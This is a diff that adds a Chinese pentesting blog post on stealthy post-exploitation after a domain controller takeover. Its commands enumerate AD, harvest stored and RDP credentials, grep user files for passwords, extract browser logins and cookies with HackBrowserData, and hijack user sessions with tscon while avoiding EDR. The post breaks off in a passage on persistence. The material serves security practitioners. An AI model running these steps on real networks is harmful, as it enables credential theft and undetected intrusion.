@@ -1,0 +1,1316 @@
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="light">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>仅仅拿下了域控？ - Satoru's Blog</title>
+
+  
+    <meta name="description" content="在高阶渗透中，信息比权限更重要，理解比占领更有价值">
+<meta property="og:type" content="article">
+<meta property="og:title" content="仅仅拿下了域控？">
+<meta property="og:url" content="https://blog.sudo.online/posts/c6650469/">
+<meta property="og:site_name" content="Satoru&#39;s Blog">
+<meta property="og:description" content="在高阶渗透中，信息比权限更重要，理解比占领更有价值">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.sudo.online/img/avatar.jpg">
+<meta property="article:published_time" content="2025-07-29T12:47:43.000Z">
+<meta property="article:modified_time" content="2025-12-13T06:44:32.775Z">
+<meta property="article:author" content="Satoru">
+<meta property="article:tag" content="Pentest">
+<meta property="article:tag" content="后渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.sudo.online/img/avatar.jpg">
+  
+  
+  
+  <meta name="keywords" content="Pentest,后渗透">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="Satoru's Blog" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+    <link rel="shortcut icon" href="/img/favicon.ico">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Satoru","sameAs":[],"image":"/img/avatar.jpg"},"dateCreated":"2025-07-29T20:47:43+08:00","dateModified":"2025-12-13T14:44:32+08:00","datePublished":"2025-07-29T20:47:43+08:00","description":"","headline":"仅仅拿下了域控？","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.sudo.online/posts/c6650469/"},"publisher":{"@type":"Organization","name":"Satoru","sameAs":[],"image":"/img/avatar.jpg","logo":{"@type":"ImageObject","url":"/img/avatar.jpg"}},"url":"https://blog.sudo.online/posts/c6650469/","keywords":"Pentest, 后渗透","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/img/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Satoru's Blog</div><div class="sub cap">Learning Cyber Security...</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 20.536C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535" opacity="0.5"/><path fill="currentColor" d="M9.5 8.75A3.25 3.25 0 1 0 12.75 12a.75.75 0 0 1 1.5 0A4.75 4.75 0 1 1 9.5 7.25a.75.75 0 0 1 0 1.5"/><path fill="currentColor" d="M17.75 12a3.25 3.25 0 0 1-3.25 3.25a.75.75 0 0 0 0 1.5A4.75 4.75 0 1 0 9.75 12a.75.75 0 0 0 1.5 0a3.25 3.25 0 0 1 6.5 0"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper markdown"><div class="widget-header dis-select"><span class="name">无限进步<<<</span></div><div class="widget-body fs14"><p>银鞍照白马，飒沓如流星</p>
+</div></widget>
+
+<widget class="widget-wrapper linklist"><div class="widget-body fs14">
+<div class="linklist left" style="grid-template-columns:repeat(1,1fr);">
+<a class="link" title="渗透测试" href="/categories/penetration"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none"><path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M14 21.71A7 7 0 0 1 5 15v-3.062A3.94 3.94 0 0 1 8.938 8h6.124A3.94 3.94 0 0 1 19 11.938V15a6.98 6.98 0 0 1-2 4.899"/><path fill="currentColor" d="M8.25 7.5a.75.75 0 0 0-1.5 0zm-.615-2.917a.75.75 0 1 0 1.246.834zM17.25 8.5v-1h-1.5v1zm-10.5-1v1h1.5v-1zm10.5 0c0-2.9-2.35-5.25-5.25-5.25v1.5a3.75 3.75 0 0 1 3.75 3.75zM12 2.25a5.25 5.25 0 0 0-4.365 2.333l1.246.834A3.75 3.75 0 0 1 12 3.75z"/><path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M19 14h3M5 14H2M14.5 3.5L17 2M9.5 3.5L7 2m13.5 18l-2-.8m2-11.2l-2 .8M3.5 20l2-.8M3.5 8l2 .8M12 21.5V15"/></g></svg><span>渗透测试</span></div></a>
+<a class="link" title="代码审计" href="/categories/code-audit"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path d="m17 7.83l1.697 1.526c1.542 1.389 2.313 2.083 2.313 2.974c0 .89-.771 1.585-2.314 2.973L17 16.83"/><path d="m13.987 5l-3.974 14.83" opacity="0.5"/><path d="M7 7.83L5.304 9.356C3.76 10.745 2.99 11.44 2.99 12.33s.771 1.585 2.314 2.973L7 16.83"/></g></svg><span>代码审计</span></div></a>
+<a class="link" title="安全研究" href="/categories/research"><div class="flex"><?xml version="1.0" encoding="UTF-8"?><svg width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M44 16C44 22.6274 38.6274 28 32 28C29.9733 28 28.0639 27.4975 26.3896 26.6104L9 44L4 39L21.3896 21.6104C20.5025 19.9361 20 18.0267 20 16C20 9.37258 25.3726 4 32 4C34.0267 4 35.9361 4.50245 37.6104 5.38959L30 13L35 18L42.6104 10.3896C43.4975 12.0639 44 13.9733 44 16Z" fill="none" stroke="#333" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>安全研究</span></div></a></div></div></widget>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/posts/a27ef720/"><span class="title">身份隐藏_无痕系列(2)</span></a><a class="item title" href="/posts/bb65c661/"><span class="title">身份隐藏_无痕系列(3)</span></a><a class="item title" href="/posts/877fc705/"><span class="title">身份隐藏_无痕系列(1)</span></a><a class="item title" href="/posts/afb5c91c/"><span class="title">一些时报</span></a><a class="item title" href="/posts/c6650469/"><span class="title">仅仅拿下了域控？</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/sat0ru-qwq" target="_blank" rel="external nofollow noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" href="mailto:s4t0ru@qq.com" rel="noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/3845874.svg"/></a><a class="social" href="/about/#comments" rel="noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/942ebbf1a4b91.svg"/></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/penetration/">penetration</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-07-29T12:47:43.000Z">2025-07-29</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-12-13T06:44:32.775Z">2025-12-13</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>仅仅拿下了域控？</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="仅仅拿下了域控？"><a href="#仅仅拿下了域控？" class="headerlink" title="仅仅拿下了域控？"></a>仅仅拿下了域控？</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接管全域过后，拔剑四顾心茫然。<strong>仅仅拿下了域控？</strong></p>
+<p>域控究竟代表了什么？哪怕你dump下了所有用户的密码hash等数据，面对画不完的拓扑，被拦截的流量，下一秒运维就会发现的危机，哪怕手握重器都有心无力。<strong>那么怎么在尽可能短的时间内扩大化战果？怎么找到真正有价值的东西？这是中文语境中大多数渗透文章缺失的部分</strong></p>
+<p>众所周知，<strong>拿下域控只是渗透中的一环</strong>。如何定位重要资产并拿下重要的内容，以及立足于内网和实战中规避明显流量特征信息收集，而不是傻瓜式的自动化用fscan、Nmap简单套一些线程做完整的信息收集。</p>
+<p>这是渗透核心问题：如何绕过”脚本小子阶段”的暴力面扫与信息堆叠，转而基于目标导向的资产定位、隐蔽行动、实战级信息收集与行动策略调整。</p>
+<p><strong>核心理念：不是收集越多信息越强，而是定位越准、干扰越少才有生存空间。</strong></p>
+<p>从”网段-&gt;主机-&gt;服务”的流量逻辑转变为”组织-&gt;业务-&gt;人员-&gt;资产-&gt;薄弱点”的思维逻辑。</p>
+<p><strong>关键点：目标导向资产链</strong></p>
+<p>组织结构分析 → 关键人员识别 → 业务系统映射 → 数据流向分析 → 安全策略评估 → 攻击路径规划</p>
+<h2 id="一、组织结构分析：绕开FScan逻辑的隐蔽信息收集"><a href="#一、组织结构分析：绕开FScan逻辑的隐蔽信息收集" class="headerlink" title="一、组织结构分析：绕开FScan逻辑的隐蔽信息收集"></a>一、组织结构分析：绕开FScan逻辑的隐蔽信息收集</h2><p>fscan + rdpscan + MS17xxx一把梭，最多会吃EDR拉黑&#x2F;运维踢出。因此我们要的是非特征性信息收集链：</p>
+<p><img src="/posts/c6650469/7279ca34-0f2f-341f-b248-9e77fc3b9713.png" alt="image.png"></p>
+<h3 id="基于组织架构的轻量枚举-一条命令一批信息"><a href="#基于组织架构的轻量枚举-一条命令一批信息" class="headerlink" title="基于组织架构的轻量枚举 - 一条命令一批信息"></a>基于组织架构的轻量枚举 - 一条命令一批信息</h3><table>
+<thead>
+<tr>
+<th>操作</th>
+<th>工具&#x2F;命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>获取当前主机与邻接主机信息</td>
+<td>net view, arp -a, WMI查询</td>
+<td>无需任何扫描</td>
+</tr>
+<tr>
+<td>AD结构探测（无密码）</td>
+<td>ldapsearch, bloodhound-python，PowerView</td>
+<td>可选用Kerberoasting收集用户信息</td>
+</tr>
+<tr>
+<td>DNS递归探测</td>
+<td>nslookup -type&#x3D;any domain.local + zone walking</td>
+<td>无需大范围端口扫描</td>
+</tr>
+<tr>
+<td>SMB管道探测邻域</td>
+<td>net group &#x2F;domain、net session等</td>
+<td>获取连接路径和关系图谱</td>
+</tr>
+<tr>
+<td>缓存凭据探测</td>
+<td>vaultcmd, mimikatz, WMI事件探测</td>
+<td>指向高权限账户位置</td>
+</tr>
+<tr>
+<td>进程与服务观察</td>
+<td>tasklist, Get-WmiObject Win32_Service</td>
+<td>辅助定位关键业务主机</td>
+</tr>
+</tbody></table>
+<h3 id="利用现有”可见面”搜集内部信息"><a href="#利用现有”可见面”搜集内部信息" class="headerlink" title="利用现有”可见面”搜集内部信息"></a>利用现有”可见面”搜集内部信息</h3><p>作为域控，有权限访问这个业务的势必是<strong>技术人员</strong>&amp;<strong>企业高管</strong>，那么从域控入手，思考技术人员的配置习惯，以及到底都是谁登录访问了这台机器，都很有必要作为我们收集的方向。</p>
+<ul>
+<li><p><strong>GPO配置导出</strong>：大量安全策略信息，包括认证策略、共享策略等</p>
+</li>
+<li><p><strong>注册表横向情报</strong>：如自动登录、共享缓存、历史连接信息 </p>
+</li>
+<li><p><strong>登录日志本地关联</strong>：可通过”谁登录过这台机器”反推出”谁可能是管理员”</p>
+</li>
+</ul>
+<p><strong>域控机上的实战信息收集清单：</strong></p>
+<h4 id="域结构情报（组织、人、权限三位一体）"><a href="#域结构情报（组织、人、权限三位一体）" class="headerlink" title="域结构情报（组织、人、权限三位一体）"></a>域结构情报（组织、人、权限三位一体）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># OU列表（组织结构）</span><br><span class="line">Get-ADOrganizationalUnit -Filter * | select Name, DistinguishedName</span><br><span class="line"></span><br><span class="line"># 域用户列表（含描述字段很重要）</span><br><span class="line">Get-ADUser -Filter * -Properties DisplayName, Description, EmailAddress | Format-List</span><br><span class="line"></span><br><span class="line"># 域安全组</span><br><span class="line">Get-ADGroup -Filter * | select Name, GroupScope, Description</span><br></pre></td></tr></table></figure>
+
+<p>看”描述””Email地址””DisplayName”可以挖人找业务、识别高价值目标。</p>
+<h4 id="权限链分析（导出关系-本地分析）"><a href="#权限链分析（导出关系-本地分析）" class="headerlink" title="权限链分析（导出关系 本地分析）"></a>权限链分析（导出关系 本地分析）</h4><p><strong>BloodHound 导出数据：</strong></p>
+<p>如果你不想跑 full ingestor，可以用轻量化方式导出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 用户-组关系、主机信息、ACL 权限等</span><br><span class="line">SharpHound.exe -c All -domain YOURDOMAIN.local -zipfilename data.zip</span><br></pre></td></tr></table></figure>
+
+<p>导出的 data.zip 本地分析即可，不需要网络回传。</p>
+<hr>
+<h2 id="二、关键人员识别：以人为核心建立信息收集视角"><a href="#二、关键人员识别：以人为核心建立信息收集视角" class="headerlink" title="二、关键人员识别：以人为核心建立信息收集视角"></a>二、关键人员识别：以人为核心建立信息收集视角</h2><p>大多数实战目标都不是机器，而是人。<strong>围绕”人”来做信息收集</strong>，比堆资产更有效。</p>
+<p>也就是我一直强调的内容：内网中一切流量都变得明显，既然拿下了域控&#x3D;&#x3D;&gt;那么将由常规的网络空间转为管理视角的业务空间</p>
+<h3 id="典型策略"><a href="#典型策略" class="headerlink" title="典型策略"></a>典型策略</h3><table>
+<thead>
+<tr>
+<th>信息源</th>
+<th>目的</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>AD中的description字段</td>
+<td>找到业务、工号、邮箱、VIP标识</td>
+</tr>
+<tr>
+<td>邮箱地址中的”别名”</td>
+<td>分辨职务和层级（如 <a href="mailto:&#x7a;&#x68;&#97;&#110;&#x67;&#121;&#45;&#x76;&#112;&#x40;&#99;&#x6f;&#114;&#x70;&#x2e;&#x6c;&#x6f;&#99;&#97;&#x6c;">zhangy-vp@corp.local</a>）</td>
+</tr>
+<tr>
+<td>共享文档中检索”密码”、”外包”、”RDP”等关键词</td>
+<td>获取敏感操作线索</td>
+</tr>
+<tr>
+<td>持续登录机器中识别多账户环境</td>
+<td>哪些人”常驻”在哪些资产</td>
+</tr>
+<tr>
+<td>SMTP&#x2F;邮件服务器日志</td>
+<td>发现与外部联系的关键资产</td>
+</tr>
+</tbody></table>
+<p><img src="/posts/c6650469/e996b68a-abea-3189-8fcd-73dcde652762.jpeg" alt="6ddca5f1d406df5eaa98b1fa79054f2.jpg"></p>
+<h3 id="凭据相关（不是mimikatz，而是静态-行为推演）"><a href="#凭据相关（不是mimikatz，而是静态-行为推演）" class="headerlink" title="凭据相关（不是mimikatz，而是静态&#x2F;行为推演）"></a>凭据相关（不是mimikatz，而是静态&#x2F;行为推演）</h3><p><strong>看谁来过域控：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 安全日志：查看 Event ID 4624（登录）</span><br><span class="line">Get-WinEvent -LogName Security | ? &#123;$_.Id -eq 4624&#125; | select -First 100 | Format-List</span><br></pre></td></tr></table></figure>
+
+<p><strong>查询本机是否保存了密码&#x2F;RDP历史：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Vault 凭据</span><br><span class="line">vaultcmd /listcreds:&quot;Windows Credentials&quot;</span><br><span class="line"></span><br><span class="line"># RDP历史（注册表）</span><br><span class="line">reg query &quot;HKCU\Software\Microsoft\Terminal Server Client\Servers&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="三、业务系统映射：从资产定位到业务理解"><a href="#三、业务系统映射：从资产定位到业务理解" class="headerlink" title="三、业务系统映射：从资产定位到业务理解"></a>三、业务系统映射：从资产定位到业务理解</h2><h3 id="组策略情报（看策略，看谁被管）"><a href="#组策略情报（看策略，看谁被管）" class="headerlink" title="组策略情报（看策略，看谁被管）"></a>组策略情报（看策略，看谁被管）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 本地有效策略</span><br><span class="line">gpresult /R</span><br><span class="line"></span><br><span class="line"># 全局策略列表</span><br><span class="line">Get-GPO -All | select DisplayName, GpoStatus, CreationTime</span><br><span class="line"></span><br><span class="line"># GPO中脚本、映射、计划任务（爆破定制逻辑）</span><br><span class="line">Get-GPOReport -Name &quot;XXX策略&quot; -ReportType HTML -Path C:\GPO-XXX.html</span><br></pre></td></tr></table></figure>
+
+<p>注意 GPO 中常嵌脚本、计划任务映射、共享驱动器等”业务手脚”。</p>
+<h3 id="关键资产与服务定位（不是扫，是读）"><a href="#关键资产与服务定位（不是扫，是读）" class="headerlink" title="关键资产与服务定位（不是扫，是读）"></a>关键资产与服务定位（不是扫，是读）</h3><p><strong>查询域中计算机对象：</strong></p>
+<p>Get-ADComputer -Filter * -Properties OperatingSystem, LastLogonDate | Format-Table Name, OS, LastLogonDate</p>
+<p>重点看命名规律，如 sql-prod-01、sap-fin-02、jump-vpn-01 、DB39、storage-88等业务侧命名。</p>
+<h3 id="重要资产定位方法论（不靠扫描靠推演）"><a href="#重要资产定位方法论（不靠扫描靠推演）" class="headerlink" title="重要资产定位方法论（不靠扫描靠推演）"></a>重要资产定位方法论（不靠扫描靠推演）</h3><h4 id="基于组织结构做推演"><a href="#基于组织结构做推演" class="headerlink" title="基于组织结构做推演"></a>基于组织结构做推演</h4><p>一般也可以<strong>通过主机名</strong>做对应的推演</p>
+<p> <strong>关键问题：</strong></p>
+<ul>
+<li><p>谁是<strong>业务管理？</strong> </p>
+</li>
+<li><p>谁负责敏感数据（如<strong>财务、人事、R&amp;D</strong>）？ </p>
+</li>
+<li><p>谁有<strong>更高权限或接口权限？</strong></p>
+</li>
+</ul>
+<h4 id="结合线索构建目标资产优先级"><a href="#结合线索构建目标资产优先级" class="headerlink" title="结合线索构建目标资产优先级"></a>结合线索构建目标资产优先级</h4><table>
+<thead>
+<tr>
+<th>线索类型</th>
+<th>实例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>登录频率高</td>
+<td>某主机被多人登录、夜间活跃</td>
+</tr>
+<tr>
+<td>数据量大</td>
+<td>文件夹&#x2F;共享目录大，含数据库连接符</td>
+</tr>
+<tr>
+<td>被访问最多</td>
+<td>日志中频繁出现RDP&#x2F;SMB访问</td>
+</tr>
+<tr>
+<td>服务关联性强</td>
+<td>DNS服务器、域控、堡垒机、工控主机</td>
+</tr>
+</tbody></table>
+<h2 id="四、数据流向分析：主动”听人说话”"><a href="#四、数据流向分析：主动”听人说话”" class="headerlink" title="四、数据流向分析：主动”听人说话”"></a>四、数据流向分析：主动”听人说话”</h2><h3 id="事件日志-文件痕迹"><a href="#事件日志-文件痕迹" class="headerlink" title="事件日志 + 文件痕迹"></a>事件日志 + 文件痕迹</h3><p><strong>看用户或系统留下的痕迹：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 最近被访问文件</span><br><span class="line">Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent</span><br><span class="line"></span><br><span class="line"># Office中最近打开的文件</span><br><span class="line">dir &quot;C:\Users\*\AppData\Roaming\Microsoft\Office\Recent&quot;</span><br></pre></td></tr></table></figure>
+
+<p>→ 能看到谁在操作什么<strong>搜索含”密码”、”账号”、”VPN”的文件内容：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ChildItem -Path C:\Users\ -Include *.txt,*.docx -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern &quot;password|vpn|账号|密码&quot; -Encoding UTF8</span><br></pre></td></tr></table></figure>
+
+<h3 id="深入用户本身：浏览器数据与用户行为分析"><a href="#深入用户本身：浏览器数据与用户行为分析" class="headerlink" title="深入用户本身：浏览器数据与用户行为分析"></a>深入用户本身：浏览器数据与用户行为分析</h3><p>当你拿到了域控，接下来的目标应该是深入到具体的办公机，挖掘用户的真实行为数据。<strong>这里不再是传统的”拿Shell-&gt;提权-&gt;横向”的机械流程，而是要像一个真正的企业用户一样，通过看似正常的数字足迹来构建完整的攻击路径。</strong></p>
+<h4 id="HackBrowserData"><a href="#HackBrowserData" class="headerlink" title="HackBrowserData"></a>HackBrowserData</h4><p>浏览器是现代用户最重要的数字入口，也是信息泄露的重灾区。相比传统的内存dump或注册表挖掘，浏览器数据挖掘更加精准、高效。</p>
+<p><img src="/posts/c6650469/f75fbf6f-d113-3303-a524-c5643e2c425d.png" alt="image.png"></p>
+<p><strong>浏览器数据收集策略：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 基础收集（适用于Chrome、Firefox、Edge等主流浏览器）</span><br><span class="line">./HackBrowserData -b chrome -f json -dir ./output</span><br><span class="line">./HackBrowserData -b firefox -f json -dir ./output</span><br><span class="line">./HackBrowserData -b edge -f json -dir ./output</span><br><span class="line"></span><br><span class="line"># 批量收集所有浏览器数据</span><br><span class="line">./HackBrowserData -b all -f json -dir ./browser_data</span><br></pre></td></tr></table></figure>
+
+<p><strong>但这里有个坑点：你立足于域控 作为nt&#x2F;system权限的同时无法直接接触到目标用户上下文，就会由于无法获取用户DPAPI Key导致无法解密用户Chrome浏览器的Cookie以及loginData表， 因此 获取域控并不代表获取一切</strong></p>
+<p><strong>下面也简单介绍几个方法</strong></p>
+<p><strong>方法1：迁移到用户 Session 再解密</strong></p>
+<ol>
+<li>查用户在哪个 Session：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>用 <code>tscon</code> 切换：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tscon &lt;session_id&gt; /dest:console</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>再执行解密工具（如 HackBrowserData），这时你就在用户的上下文中，也就拥有了解密权限。</li>
+</ol>
+<p> <strong>方法2：等用户登录，自动抓数据</strong> </p>
+<ol>
+<li><p>放个计划任务、WMI事件、LNK、宏脚本等</p>
